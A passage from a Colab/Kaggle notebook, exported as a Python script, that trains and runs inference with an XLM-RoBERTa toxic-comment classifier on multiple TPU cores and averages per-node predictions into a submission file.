            losses, final_scores = self.validation(para_loader.per_device_loader(self.device))

            self.log(f'[RESULT]: Validation. Epoch: {self.epoch}, loss: {losses.avg:.5f}, final_score: {final_scores.avg:.5f}, time: {(time.time() - t):.5f}')

            if self.config.validation_scheduler:
                self.scheduler.step(metrics=final_scores.avg)

            self.epoch += 1

    def run_tuning_and_inference(self, test_loader, validation_tune_loader):
        for e in range(2):
            self.optimizer.param_groups[0]['lr'] = self.config.lr*xm.xrt_world_size()
            para_loader = pl.ParallelLoader(validation_tune_loader, [self.device])
            losses, final_scores = self.train_one_epoch(para_loader.per_device_loader(self.device))
            para_loader = pl.ParallelLoader(test_loader, [self.device])
            self.run_inference(para_loader.per_device_loader(self.device))

    def validation(self, val_loader):
        self.model.eval()
        losses = AverageMeter()
        final_scores = RocAucMeter()

        t = time.time()

        for step, (targets, inputs, attention_masks) in enumerate(val_loader):
            if self.config.verbose:
                if step % self.config.verbose_step == 0:
                    xm.master_print(
                        f'Valid Step {step}, loss: ' + \
                        f'{losses.avg:.5f}, final_score: {final_scores.avg:.5f}, ' + \
                        f'time: {(time.time() - t):.5f}'
                    )
            with torch.no_grad():
                inputs = inputs.to(self.device, dtype=torch.long)
                attention_masks = attention_masks.to(self.device, dtype=torch.long)
                targets = targets.to(self.device, dtype=torch.float)

                outputs = self.model(inputs, attention_masks)
                loss = self.criterion(outputs, targets)

                batch_size = inputs.size(0)

                final_scores.update(targets, outputs)
                losses.update(loss.detach().item(), batch_size)

        return losses, final_scores

    def train_one_epoch(self, train_loader):
        self.model.train()

        losses = AverageMeter()
        final_scores = RocAucMeter()
        t = time.time()

        for step, (targets, inputs, attention_masks) in enumerate(train_loader):
            if self.config.verbose:
                if step % self.config.verbose_step == 0:
                    self.log(
                        f'Train Step {step}, loss: ' + \
                        f'{losses.avg:.5f}, final_score: {final_scores.avg:.5f}, ' + \
                        f'time: {(time.time() - t):.5f}'
                    )

            inputs = inputs.to(self.device, dtype=torch.long)
            attention_masks = attention_masks.to(self.device, dtype=torch.long)
            targets = targets.to(self.device, dtype=torch.float)

            self.optimizer.zero_grad()

            outputs = self.model(inputs, attention_masks)
            loss = self.criterion(outputs, targets)

            batch_size = inputs.size(0)

            final_scores.update(targets, outputs)

            losses.update(loss.detach().item(), batch_size)

            loss.backward()
            xm.optimizer_step(self.optimizer)

            if self.config.step_scheduler:
                self.scheduler.step()

        self.model.eval()
        self.save('last-checkpoint.bin')

        return losses, final_scores

    def run_inference(self, test_loader):
        self.model.eval()
        result = {'id': [], 'toxic': []}
        t = time.time()

        for step, (ids, inputs, attention_masks) in enumerate(test_loader):
            if self.config.verbose:
                if step % self.config.verbose_step == 0:
                    xm.master_print(f'Prediction Step {step}, time: {(time.time() - t):.5f}')

            with torch.no_grad():
                inputs = inputs.to(self.device, dtype=torch.long)
                attention_masks = attention_masks.to(self.device, dtype=torch.long)
                outputs = self.model(inputs, attention_masks)
                toxics = nn.functional.softmax(outputs, dim=1).data.cpu().numpy()[:,1]

            result['id'].extend(ids.cpu().numpy())
            result['toxic'].extend(toxics)

        result = pd.DataFrame(result)
        node_count = len(glob('node_submissions/*.csv'))
        result.to_csv(f'node_submissions/submission_{node_count}_{datetime.utcnow().microsecond}_{random.random()}.csv', index=False)

    def save(self, path):
        xm.save(self.model.state_dict(), path)

    def log(self, message):
        if self.config.verbose:
            xm.master_print(message)
        with open(self.log_path, 'a+') as logger:
            xm.master_print(f'{message}', logger)


# + {"colab_type": "code", "id": "kO9ovGhdwb7W", "colab": {}}
from transformers import XLMRobertaModel

class ToxicSimpleNNModel(nn.Module):

    def __init__(self):
        super(ToxicSimpleNNModel, self).__init__()
        self.backbone = XLMRobertaModel.from_pretrained(BACKBONE_PATH)
        self.dropout = nn.Dropout(0.3)
        aux_len = 0

        if use_aux:
            aux_len = 5
        self.linear = nn.Linear(
            in_features=self.backbone.pooler.dense.out_features*2,
            out_features=2+aux_len,
        )

    def forward(self, input_ids, attention_masks):
        bs, seq_length = input_ids.shape
        seq_x, _ = self.backbone(input_ids=input_ids, attention_mask=attention_masks)
        apool = torch.mean(seq_x, 1)
        mpool, _ = torch.max(seq_x, 1)
        x = torch.cat((apool, mpool), 1)
        x = self.dropout(x)

        return self.linear(x)


# + {"colab_type": "code", "id": "dZmTJ4XQwb9y", "colab": {}}
class TrainGlobalConfig:
    """ Global Config for this notebook """
    num_workers = 0  # количество воркеров для loaders
    batch_size = 16  # bs
    n_epochs = 3  # количество эпох для обучения
    lr = 0.5 * 1e-5 # стартовый learning rate (внутри логика работы с мульти TPU домножает на кол-во процессов)
    fold_number = 0  # номер фолда для обучения

    # -------------------
    verbose = True  # выводить принты
    verbose_step = 50  # количество шагов для вывода принта
    # -------------------

    # --------------------
    step_scheduler = False  # выполнять scheduler.step после вызова optimizer.step
    validation_scheduler = True  # выполнять scheduler.step после валидации loss (например для плато)
    SchedulerClass = torch.optim.lr_scheduler.ReduceLROnPlateau
    scheduler_params = dict(
        mode='max',
        factor=0.7,
        patience=0,
        verbose=False,
        threshold=0.0001,
        threshold_mode='abs',
        cooldown=0,
        min_lr=1e-8,
        eps=1e-08
    )
    # --------------------

    # -------------------
    criterion = LabelSmoothing()
    # -------------------


# + {"colab_type": "code", "id": "_79qoceFwcAF", "outputId": "09f5510d-c2e1-4f19-9dfa-8956d414a564", "colab": {"base_uri": "https://localhost:8080/", "height": 116, "referenced_widgets": ["0ccb005ba947422690d07ef78baa1a7a", "294b563929184f44a10a4863a9226dc8", "24d04c1e3ad04c51b9a00b245f878291", "0526c4b17e21402491202127c3a3d085", "39a1cd7166f145d8aec6502badba27ff", "8ab315cc4bf54df3bd7cb3f8d1c91c66", "45ed802494e943c1b32597829a5232c0", "707a2436e59b447eab6fce9dfd6f8c4d", "387da2c8aa984eaa84ebaa00205ec89a", "47d4753fe35a46a3b8599bb4da4f8630", "c88d3ee1730d45468fb04fa06192246e", "b4ee953b01bc4f82b29ae4885dc9dd24", "9035a40f51e84a219a82d4524f60d0f1", "4ee4bf92166a4b5d8bfbe816a75a9bff", "2562c88dcf9f41a7ac3d80bb5a8f69fa", "c05fd87a1a0b49c98c078d8c33fb8b0f"]}}
net = ToxicSimpleNNModel()


# + {"colab_type": "code", "id": "INecI_CbxXA_", "colab": {}}
def _mp_fn(rank, flags):
    device = xm.xla_device()
    net.to(device)

    train_sampler = DistributedSamplerWrapper(
        sampler=BalanceClassSampler(labels=train_dataset.get_labels(), mode="downsampling"),
        num_replicas=xm.xrt_world_size(),
        rank=xm.get_ordinal(),
        shuffle=True
    )
    train_loader = torch.utils.data.DataLoader(
        train_dataset,
        batch_size=TrainGlobalConfig.batch_size,
        sampler=train_sampler,
        pin_memory=False,
        drop_last=True,
        num_workers=TrainGlobalConfig.num_workers,
    )
    validation_sampler = torch.utils.data.distributed.DistributedSampler(
        validation_dataset,
        num_replicas=xm.xrt_world_size(),
        rank=xm.get_ordinal(),
        shuffle=False
    )
    validation_loader = torch.utils.data.DataLoader(
        validation_dataset,
        batch_size=TrainGlobalConfig.batch_size,
        sampler=validation_sampler,
        pin_memory=False,
        drop_last=False,
        num_workers=TrainGlobalConfig.num_workers
    )
    validation_tune_sampler = torch.utils.data.distributed.DistributedSampler(
        validation_tune_dataset,
        num_replicas=xm.xrt_world_size(),
        rank=xm.get_ordinal(),
        shuffle=True
    )
    validation_tune_loader = torch.utils.data.DataLoader(
        validation_tune_dataset,
        batch_size=TrainGlobalConfig.batch_size,
        sampler=validation_tune_sampler,
        pin_memory=False,
        drop_last=False,
        num_workers=TrainGlobalConfig.num_workers
    )
    test_sampler = torch.utils.data.distributed.DistributedSampler(
        test_dataset,
        num_replicas=xm.xrt_world_size(),
        rank=xm.get_ordinal(),
        shuffle=False
    )
    test_loader = torch.utils.data.DataLoader(
        test_dataset,
        batch_size=TrainGlobalConfig.batch_size,
        sampler=test_sampler,
        pin_memory=False,
        drop_last=False,
        num_workers=TrainGlobalConfig.num_workers
    )

    if rank == 0:
        time.sleep(1)

    fitter = TPUFitter(model=net, device=device, config=TrainGlobalConfig)
    fitter.fit(train_loader, validation_loader)
    fitter.run_tuning_and_inference(test_loader, validation_tune_loader)


# + {"colab_type": "code", "id": "aKuUULH7l5W1", "outputId": "6f9fe5df-d9d8-4dc5-f0a8-c45f9886750c", "colab": {"base_uri": "https://localhost:8080/", "height": 677}}
FLAGS={}
xmp.spawn(_mp_fn, args=(FLAGS,), nprocs=8, start_method='fork')
from datetime import date; today = date.today(); output_model_file='bert_tpu_trained.bin'
torch.save(net.state_dict(), f"{today}_{output_model_file}")

# + {"colab_type": "code", "id": "Wu0VhhZAFuYs", "colab": {}}
submission = pd.concat([pd.read_csv(path) for path in glob('node_submissions/*.csv')]).groupby('id').mean()
submission['toxic'].hist(bins=100)

# + {"colab_type": "code", "id": "RRr-yzJ_yVTW", "colab": {}}
submission.to_csv(f'{ROOT_PATH}/submission.csv')

# + {"colab_type": "code", "id": "ARz9TllfyVVa", "colab": {}}
# # !cp log.txt '/content/drive/My Drive/jigsaw2020-kaggle-public-baseline/'
